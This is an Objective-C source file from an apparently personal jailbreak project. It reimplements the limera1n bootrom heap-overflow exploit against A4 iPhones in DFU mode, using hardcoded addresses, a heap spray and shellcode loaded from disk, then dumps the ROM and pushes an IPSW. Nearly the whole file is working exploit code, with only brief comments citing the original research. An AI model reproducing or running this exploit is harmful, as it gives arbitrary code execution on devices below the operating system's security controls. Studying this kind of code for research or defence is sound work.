//
//  main.m
//  jailbreak
//
//  Created by Phillip Tennen on 08/07/2023.
//

#import <Foundation/Foundation.h>
#import <IOKit/usb/IOUSBLib.h>
#import <libusb-1.0/libusb.h>

#define usb_device_t IOUSBDeviceInterface942
#define DeviceInterfaceID kIOUSBDeviceInterfaceID942
#define DeviceVersion 942

//#define usbi_mutex_t            pthread_mutex_t
typedef pthread_mutex_t usbi_mutex_t;
struct list_head {
    struct list_head *prev, *next;
};

struct libusb_device_handle {
    /* lock protects claimed_interfaces */
    usbi_mutex_t lock;
    unsigned long claimed_interfaces;

    struct list_head list;
    struct libusb_device *dev;
    int auto_detach_kernel_driver;
};


void dummy_callback(void) { }

/*
struct libusb_device {
    usbi_mutex_t lock;
    int refcnt;

    struct libusb_context *ctx;

    uint8_t bus_number;
    uint8_t device_address;
    uint8_t num_configurations;

    struct list_head list;
    unsigned long session_data;
    unsigned char os_priv[0];
};
 */

typedef volatile long usbi_atomic_t;
struct libusb_device {
    usbi_atomic_t refcnt;

    struct libusb_context *ctx;
    struct libusb_device *parent_dev;

    uint8_t bus_number;
    uint8_t port_number;
    uint8_t device_address;
    enum libusb_speed speed;

    struct list_head list;
    unsigned long session_data;

    struct libusb_device_descriptor device_descriptor;
    usbi_atomic_t attached;
};

struct darwin_device_priv {
  IOUSBDeviceDescriptor dev_descriptor;
  UInt32                location;
  char                  sys_path[21];
  usb_device_t        **device;
  int                   open_count;
  UInt8                 first_config, active_config;
};

void handle_sigint_received(int sig) {
    printf("Received SIGINT");
    exit(0);
}

void handle_device_added(void* connection_ref, io_iterator_t iterator) {
    // Iterate each connected device
    io_service_t usb_device;
    while ((usb_device = IOIteratorNext(iterator))) {
        // Get the device name
        io_name_t device_name_raw = {0};
        kern_return_t ret = IORegistryEntryGetName(usb_device, device_name_raw);
        if (ret != KERN_SUCCESS) {
            NSLog(@"Failed to read device name!");
            exit(1);
        }
        
        CFStringRef device_name = CFStringCreateWithCString(kCFAllocatorDefault,
                                                            device_name_raw,
                                                            kCFStringEncodingASCII);
        NSLog(@"Device: %@", device_name);
        CFShow(device_name);
    }
}

struct libusb_device_handle* find_device(struct libusb_context* context, int vendor_id, int device_id) {
    struct libusb_device** device_list = NULL;
    ssize_t device_count = libusb_get_device_list(context, &device_list);
    NSLog(@"Got device list %p", device_list);
    struct libusb_device_handle* handle = NULL;
    
    for (ssize_t i = 0; i < device_count; i++) {
        struct libusb_device* device = device_list[i];
        struct libusb_device_descriptor device_desc;
        libusb_get_device_descriptor(device, &device_desc);
        NSLog(@"Found device: [Vendor 0x%04x], [Product 0x%04x]", device_desc.idVendor, device_desc.idProduct);
        
        if (device_desc.idVendor == vendor_id && device_desc.idProduct == device_id) {
            libusb_open(device, &handle);
            NSLog(@"Found device handle %p", handle);
            break;
        }
    }
    libusb_free_device_list(device_list, 1);
    
    return handle;
}

long readfile(char* filename, void* buffer) {
    FILE* f = fopen(filename, "rb");
    // if !f
    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    fseek(f, 0, SEEK_SET);
    fread(buffer, 1, len, f);
    fclose(f);
    return len;
}

uint32_t get_file_len(FILE* f) {
    fseek(f, 0, SEEK_END);
    uint32_t len = ftell(f);
    fseek(f, 0, SEEK_SET);
    return len;
}

void get_status(struct libusb_device_handle* device_handle) {
    unsigned char status[6];
    int ret = libusb_control_transfer(device_handle, 0xa1, 3, 0, 0, status, 6, 100);
    NSLog(@"get_status ret = %d", ret);
    for (int i = 0; i < 6; i++) {
        //NSLog(@"%02x", status[i]);
    }
}

void dfu_notify_upload_finished(struct libusb_device_handle* device_handle) {
    // ipwndfu calls this "request_image_validation"
    // Ref: https://archive.conference.hitb.org/hitbsecconf2013kul/materials/D2T1%20-%20Joshua%20'p0sixninja'%20Hill%20-%20SHAttered%20Dreams.pdf
    // "Image validation starts whenever the global “file received” variable has been set."
    // "This can be caused by sending 1 empty “Send Data” packet, and 3 “Get Status” packets followed by a USB reset."
    int ret = libusb_control_transfer(device_handle, 0x21, 1, 0, 0, 0, 0, 100);
    for (int i = 0; i < 3; i++) {
        get_status(device_handle);
    }
    libusb_reset_device(device_handle);
}

struct libusb_device_handle* usb_wait_device_connection(struct libusb_context* context, struct libusb_device_handle* device_handle) {
    //sleep(2);
    //libusb_close(device_handle);
    return find_device(context, 0x05ac, 0x1227);
}

void inner_main(void) {
    NSLog(@"Main running");
    // Initialize USB connection with the DFU device
    struct libusb_context* context = NULL;
    libusb_init(&context);
    NSLog(@"Got context: %p", context);
    struct libusb_device_handle* device_handle = find_device(context, 0x05ac, 0x1227);
    if (!device_handle) {
        NSLog(@"Failed to find DFU device.");
        return;
    }
    
    // Run limera1n
#define LOADADDR    0x84000000
// A4:
#define EXPLOIT_LR    0x8403BF9C
#define LOADADDR_SIZE    0x2C000
#define FOUR_K_PAGE 0x1000
    unsigned char buf[LOADADDR_SIZE] = {0};
    
#define BUF_SIZE 0x800
    unsigned char shellcode[BUF_SIZE] = {0};
    unsigned int stack_addr = EXPLOIT_LR;
    // PT: Is the +1 to indicate THUMB?
    unsigned int shellcode_addr = LOADADDR + LOADADDR_SIZE - FOUR_K_PAGE + 1;
    
    // Read the shellcode into the buffer
    // TODO: Check the shellcode looks correct?
    long shellcode_length = readfile("/Users/philliptennen/Documents/Jailbreak/jailbreak/trimmed_shellcode", shellcode);
    NSLog(@"Shellcode len %x", shellcode_length);
    
    memset(buf, 0xcc, BUF_SIZE);
    for (int i = 0; i < BUF_SIZE; i += 0x40) {
        unsigned int* heap = (unsigned int*)(buf + i);
        heap[0] = 0x405;
        heap[1] = 0x101;
        heap[2] = shellcode_addr;
        heap[3] = stack_addr;
    }
    
    int sent_bytes = libusb_control_transfer(device_handle,
                                             0x21,
                                             1,
                                             0,
                                             0,
                                             buf,
                                             BUF_SIZE,
                                             1000);
    NSLog(@"Sent data to copy: %X", sent_bytes);
    memset(buf, 0xcc, BUF_SIZE);
    for (int i = 0; i < (LOADADDR_SIZE - 0x1800); i += BUF_SIZE) {
        sent_bytes = libusb_control_transfer(device_handle, 0x21, 1, 0, 0, buf, BUF_SIZE, 1000);
        NSLog(@"Sent bytes %X %s\n", sent_bytes, libusb_error_name(sent_bytes));
    }
    
    sent_bytes = libusb_control_transfer(device_handle, 0x21, 1, 0, 0, shellcode, BUF_SIZE, 1000);
    NSLog(@"Sent %X bytes of shellcode, length = %X", sent_bytes, shellcode_length);
    memset(buf, 0xbb, 0x800);
    sent_bytes = libusb_control_transfer(device_handle, 0xa1, 1, 0, 0, buf, 0x800, 1000);
    NSLog(@"never freed %X", sent_bytes);
    
    sent_bytes = libusb_control_transfer(device_handle, 0x21, 1, 0, 0, buf, 0x800, 10);
    NSLog(@"new one %x", sent_bytes);
    
    sent_bytes = libusb_control_transfer(device_handle, 0x21, 2, 0, 0, buf, 0, 1000);
    NSLog(@"Sent exploit to heap overflow %X %s", sent_bytes, libusb_error_name(sent_bytes));
    
    libusb_reset_device(device_handle);
    dfu_notify_upload_finished(device_handle);
    //libusb_reset_device(device_handle);
    NSLog(@"dump started?!");
    // communicate with the payload
    struct libusb_device_handle* device_handle2 = usb_wait_device_connection(context, device_handle);
    NSLog(@"got handle2 %p", device_handle2);
    
    unsigned int addr = 0x0;
    FILE* fout = fopen("/Users/philliptennen/Documents/Jailbreak/jailbreak/rom.bin", "wb");
    unsigned char data[0x800] = {0};
    for (int addr = 0; addr < 0x10000; addr += 0x800) {
        int ret = libusb_control_transfer(device_handle2, 0xa1, 2, 0, 0, data, 0x800, 0);
        NSLog(@"ret %d", ret);
        fwrite(data, 1, 0x800, fout);
    }
    fclose(fout);
    
    NSLog(@"all done");
    
    // Now, try writing an ipsw to see what happens?!
    FILE* ipsw = fopen("/Users/philliptennen/Downloads/iPhone3,1_6.1.3_10B329_Restore.ipsw", "rb");
    uint32_t file_len = get_file_len(ipsw);
    NSLog(@"IPSW is %d bytes", file_len);
    unsigned char ipsw_data[0x8000] = {0};
    for (int i = 0; i < file_len; i += 0x8000) {
        char ipsw_buf[0x8000] = {0};
        int read_bytes = fread(ipsw_buf, 1, 0x8000, ipsw);
        NSLog(@"\tread %d bytes, progress = %.2f", read_bytes, (float)read_bytes / (float)file_len);
        int ret = libusb_control_transfer(device_handle2, 0x21, 1, 0, 0, ipsw_buf, 0x8000, 3000);
        NSLog(@"\t\tret %d", ret);
    }
    
    NSLog(@"Upload finished, will ask device to validate...");
    dfu_notify_upload_finished(device_handle);
    
    libusb_close(device_handle);
    libusb_exit(context);
}

int main(int argc, const char* argv[]) {
    @autoreleasepool {
        inner_main();
    }
    return 0;
}
